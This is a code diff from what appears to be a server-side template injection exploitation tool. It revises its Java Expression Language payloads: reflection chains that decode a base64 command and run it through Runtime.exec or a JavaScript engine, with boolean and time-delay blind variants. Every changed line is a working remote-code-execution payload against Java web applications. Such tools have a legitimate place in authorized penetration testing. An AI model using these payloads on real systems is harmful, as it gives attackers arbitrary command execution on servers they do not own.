@@ -41,29 +41,29 @@ class Java_EL_generic(java.Java):
             },
             'evaluate': {
                 'call': 'render',
-                'evaluate': """''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).toString()""",
+                'evaluate': """''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(new java.lang.String(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).toString()""",
                 'test_eval': '"executed".replace("xecu", "valua")',
                 'test_eval_expected': 'evaluated'
             },
             'evaluate_boolean': {
                 'call': 'inject',
-                'evaluate_blind': """(''.getClass().forName('java.lang.Integer').valueOf('1')/((''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).equals(false))?1:0)+'')""",
+                'evaluate_blind': """(''.getClass().forName('java.lang.Integer').valueOf('1')/((''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(new java.lang.String(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).equals(false))?1:0)+'')""",
             },
             'evaluate_blind': {
                 'call': 'inject',
-                'evaluate_blind': """((!''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).equals(false))?T(java.lang.Thread).sleep({delay}000):0).toString()""",
+                'evaluate_blind': """((!''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(new java.lang.String(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).equals(false))?(''.getClass().forName('java.lang.Thread').sleep({delay}000)):0).toString()""",
             },
             'execute': {
                 'call': 'render',
-                'execute': """''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec(''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).inputStream.readAllBytes())""",
+                'execute': """new java.lang.String(''.getClass().forName('java.lang.Runtime').getRuntime().exec(new java.lang.String(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).inputStream.readAllBytes())""",
             },
             'execute_boolean': {
                 'call': 'inject',
-                'execute_blind': """(''.getClass().forName('java.lang.Integer').valueOf('1')/((''.getClass().forName('java.lang.Runtime').getRuntime().exec(''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).waitFor()==0)?1:0)+'')""",
+                'execute_blind': """(''.getClass().forName('java.lang.Integer').valueOf('1')/((''.getClass().forName('java.lang.Runtime').getRuntime().exec(new java.lang.String(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).waitFor()==0)?1:0)+'')""",
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """(''.getClass().forName('java.lang.Runtime').getRuntime().exec(''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).waitFor().equals(0)?T(java.lang.Thread).sleep({delay}000):0).toString()""",
+                'execute_blind': """(''.getClass().forName('java.lang.Runtime').getRuntime().exec(new java.lang.String(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).waitFor().equals(0)?(''.getClass().forName('java.lang.Thread').sleep({delay}000)):0).toString()""",
             }
         })
 
